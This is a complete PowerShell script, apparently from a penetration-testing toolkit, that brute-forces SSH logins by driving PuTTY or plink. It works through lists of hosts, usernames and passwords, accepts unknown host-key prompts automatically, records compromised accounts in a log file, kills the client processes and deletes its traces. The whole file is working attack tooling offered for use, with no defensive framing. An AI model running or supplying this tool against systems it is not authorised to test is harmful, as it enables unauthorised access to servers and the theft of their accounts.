function ssh-putty-brute {
<#
.SYNOPSIS
    SSH login bruteforce wrapper around PuTTY.

.DESCRIPTION
    To see usage examples, type: "man ssh-putty-brute -examples"

.PARAMETER h
    Target SSH host(s)

.PARAMETER p
    SSH port

.PARAMETER u
    Username(s)

.PARAMETER pw
    Password(s)

.PARAMETER client
    Specify whether to use putty or plink client (default is plink)

.PARAMETER Debug
    Do not erase logs from putty or plink

.NOTES
    Name: ssh-putty-brute.ps1
    Author: InfosecMatter
    DateCreated: 25Apr2020
    Version: 1.0

.LINK
    https://infosecmatter.com/

.EXAMPLE
    ssh-putty-brute -h 10.10.10.1 -p 22 -u root -pw pass123
    Test SSH login against 10.10.10.1 with user root and password pass123

.EXAMPLE
    ssh-putty-brute -h (gc .\ips.txt) -p 22 -u root -pw pass123
    Test SSH login against list of hosts in ips.txt file with user root and password pass123

.EXAMPLE
    ssh-putty-brute -h 10.10.10.1 -p 22 -u @("root","user","adm") -pw pass123
    Test SSH login against 10.10.10.1 with user root, user and adm with password pass123

.EXAMPLE
    ssh-putty-brute -h (gc .\ips.txt) -p 22 -u root -pw (gc .\pwdlist.txt)
    Test SSH login against list of hosts in ips.txt with user root and password list pwdlist.txt

.EXAMPLE
    ssh-putty-brute -h (gc .\ips.txt) -p 22 -u (gc .\userlist.txt) -pw (gc .\pwdlist.txt)
    Test SSH login against list of hosts in ips.txt with list of usernames userlist.txt and password list pwdlist.txt
#>
[cmdletbinding(
  DefaultParameterSetName = '',
  ConfirmImpact = 'low'
)]
  Param(
    [Parameter(
      Mandatory = $True,
      ParameterSetName = '',
      ValueFromPipeline = $True)]
      [array]$h,
    [Parameter(
      Mandatory = $True,
      ParameterSetName = '',
      ValueFromPipeline = $True)]
      [array]$u,
    [Parameter(
      Mandatory = $True,
      ParameterSetName = '',
      ValueFromPipeline = $True)]
      [array]$pw,
    [Parameter(
      Mandatory = $True,
      ParameterSetName = '')]
      [int]$p,
    [Parameter(
      Mandatory = $False,
      ParameterSetName = '',
      ValueFromPipeline = $False)]
      [string]$client
  )
  Begin {
    $ErrorActionPreference = "SilentlyContinue"
  }
  Process {
    $sshclient = ""
    if ($client) {
      if ($client -Match "putty") {
        $client = "putty.exe"
      } else {
        $client = "plink.exe"
      }
      if (".\"+$client | Test-Path) {
        $sshclient = ".\"+$client
      } elseif (gcm $client) { 
        $sshclient = $client
      } else {
        Write-Host "Cannot find ${client}!`nEither make sure ${client} is in the PATH or put it in the current working directory."
        return
      }
    } else {
      # No prefered client
      if (".\plink.exe" | Test-Path) {
        $sshclient = ".\plink.exe"
      } elseif (gcm "plink.exe") {
        $sshclient = "plink.exe"
      } elseif (".\putty.exe" | Test-Path) {
        $sshclient = ".\putty.exe"
      } elseif (gcm "putty.exe") {
        $sshclient = "putty.exe"
      } else {
        Write-Host "Cannot find plink.exe nor putty.exe!`nMake sure either of then is in the PATH or in the current working directory."
        return
      }
    }
    
    foreach($rhost in $h) {
      if (!(worker-test-port $rhost $p)) {
        Write-Host "$rhost,$p,Port unreachable"
        continue
      }
      foreach($user in $u) {
        foreach($pass in $pw) {
          $resultfile = ".\ssh-putty-brute.log"
          $x = (gc $resultfile | sls "^$rhost,$p,$user,.*,True$")
          if ($x) {
            Write-Host "SSH account $user on ${rhost}:$p already compromised"
            gc $resultfile | sls "^$rhost,$p,$user,.*,True$"
            break
          }
          $x = (gc $resultfile | sls -CaseSensitive "^$rhost,$p,$user,$pass,")
          if ($x) {
            Write-Host "SSH account $user/$pass already tried on ${rhost}:$p"
            continue
          }

          $output = "$rhost,$p,$user,$pass,"
          $result = ssh-putty-brute-worker $sshclient $rhost $p $user $pass
          $output += $result
          Write-Host "$output"
          echo $output >>$resultfile
          if ($result -Match 'True') {
            break
          }
        }
      }
    }
  }
  End {
  }
}

Function ssh-putty-brute-worker {
  param($sshclient,$rhost,$port,$user,$pass)
  $ErrorActionPreference = "SilentlyContinue"
  
  $puttyregpath="Registry::HKEY_CURRENT_USER\SoftWare\SimonTatham\PuTTY\SshHostKeys"
  $log = ".\log.$rhost.$port.$user.log"
  $cmdfile = ".\cmd.$rhost.$port.$user.txt"
  rm "${log}" -Force
  rm "${log}.in" -Force
  rm "${log}.err" -Force
  rm "${cmdfile}" -Force
  echo "echo success;exit" | out-file -encoding ASCII $cmdfile
  
  if ($sshclient -Match "putty.exe") {
    if(-not (Test-Path $puttyregpath) -Or (gp $puttyregpath) -NotMatch "${port}:${rhost}=") {
      # First time we are seeing this SSH server. We don't have the SSH key fingerprint stored yet
      # We have to start minimized and confirm the SSH key fingerprint popup window later on
      Start-Process -WindowStyle Minimized "$sshclient" -ArgumentList "$rhost -P $port -l $user -pw $pass -sessionlog $log -m $cmdfile"
    } else {
      # Known SSH server - no SSH key fingerprint popup
      Start-Process -WindowStyle Hidden "$sshclient" -ArgumentList "$rhost -P $port -l $user -pw $pass -sessionlog $log -m $cmdfile"
    }
  } else {
    if(-not (Test-Path $puttyregpath) -Or (gp $puttyregpath) -NotMatch "${port}:${rhost}=") {
      # First time we are seeing this SSH server. We don't have the SSH key fingerprint stored yet
      # https://serverfault.com/questions/420526/auto-storing-server-host-key-in-cache-with-plink
      echo "y" | out-file -encoding ASCII "${log}.in"
      Start-Process -NoNewWindow "$sshclient" -ArgumentList "-ssh -P ${port} ${user}@${rhost} 'exit'" -RedirectStandardInput "${log}.in" -RedirectStandardOutput $log -RedirectStandardError "${log}.err"
      rm "${log}" -Force
      rm "${log}.in" -Force
      rm "${log}.err" -Force
    }
    Start-Process -NoNewWindow "$sshclient" -ArgumentList "-batch -v $rhost -P $port -l $user -pw $pass -m $cmdfile" -RedirectStandardOutput $log -RedirectStandardError "${log}.err"
  }

  $mpid = ""
  $result = "NotSure"
  $timeout = 10
  for($i = 1; $i -le $timeout; $i++){
    # Identify our putty/plink PID
    if ($sshclient -Match "putty.exe") {
      $mpid = (Get-WmiObject Win32_Process -filter "CommandLine LIKE '%putty.exe%$rhost -P $port -l $user -pw $pass %'").ProcessId
    } else {
      $mpid = (Get-WmiObject Win32_Process -filter "CommandLine LIKE '%plink.exe%$rhost -P $port -l $user -pw $pass %'").ProcessId
    }

    # Check if there is the success message in the console output log
    $x = (gc $log | sls "^success$")
    if ($x) {
      $result = "True"
      break
    }
    
    if ($sshclient -Match "putty.exe") {
      # Putty: Check if there is password: prompt in the console log
      $x = (gc $log | sls "'s password: $")
      if ($x) {
        $result = "False"
        break
      }
    } else {
      # Plink: Check error log for login failure
      $x = (gc "${log}.err" | sls "Password authentication failed")
      if ($x) {
        $result = "False"
        break
      }
    }
     
    # We don't have putty/plink PID any more
    if (!$mpid) {
      break
    }
    
    if ($sshclient -Match "putty.exe") {
      if(-not (Test-Path $puttyregpath) -Or (gp $puttyregpath) -NotMatch "${port}:${rhost}=") {
        # We are using putty and this is the first time we are seeing this SSH server. Accept the SSH server key fingerprint popup
        $wnhd = Get-Process | Where-Object { $_.MainWindowTitle -Match "$rhost - PuTTY" } | Select-Object -ExpandProperty MainWindowHandle
        if ($wnhd) {
          [void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms')
          [System.Windows.Forms.SendKeys]::SendWait("Y")
        }
      }
    }
    
    sleep 1
  }

  # If our putty/plink is still running, kill it
  if ($mpid) {
    if (ps -id $mpid){
      kill -Force $mpid
    }
  }
  
  # Cleanup
  if($PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent -ne $true) {
    rm "${log}" -Force
    rm "${log}.in" -Force
    rm "${log}.err" -Force
    rm "${cmdfile}" -Force
  }
  
  return $result
}

Function worker-test-port {
  param($rhost,$rport)
  $timeout = 3
  try {
    $t = new-Object system.Net.Sockets.TcpClient
    $c = $t.BeginConnect($rhost,$rport,$null,$null)
    $w = $c.AsyncWaitHandle.WaitOne($timeout*1000,$false)
    If(!$w) {
      $t.Close()
      return $false
    } else {
      $null = $t.EndConnect($c)
      $t.Close()
      return $true
    }
  } catch {
    return $false
  }
}
